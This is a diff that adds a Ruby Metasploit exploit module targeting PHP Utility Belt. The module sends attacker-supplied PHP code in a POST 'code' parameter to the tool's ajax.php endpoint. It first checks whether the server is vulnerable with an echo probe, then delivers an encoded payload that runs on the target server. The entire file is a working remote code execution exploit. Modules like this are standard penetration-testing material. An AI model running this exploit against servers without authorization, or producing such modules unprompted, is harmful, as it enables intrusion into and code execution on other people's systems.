@@ -1,0 +1,81 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'PHP Utility Belt Remote Code Execution',
+      'Description'    => %q{
+         This module exploits a remote code execution vulnerability in PHP Utility Belt,
+         which is a set of tools for PHP developers and should not be installed in a
+         production environment, since this application runs arbitrary PHP code as an
+         intended functionality.
+      },
+      'Author'         =>
+        [
+          'WICS',     # initial discovery
+          'Jay Turla' # msf
+        ],
+      'References'     =>
+        [
+          ['EDB', '38901'],
+          ['URL', 'https://github.com/mboynes/php-utility-belt'] # Official Repo
+        ],
+      'DisclosureDate' => 'Aug 12 2015',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'Space'       => 2000,
+          'DisableNops' => true
+        },
+      'Targets'        =>
+        [
+          ['PHP Utility Belt', {}]
+        ],
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php'])
+      ], self.class)
+  end
+
+  def check
+    txt = Rex::Text.rand_text_alpha(8)
+    res = http_send_command("echo #{txt};")
+
+    if res && res.body.include?(txt)
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    http_send_command(payload.encoded)
+  end
+
+  def http_send_command(cmd)
+    send_request_cgi(
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path),
+      'vars_post' => {
+        'code' => cmd
+      }
+    )
+  end
+
+end
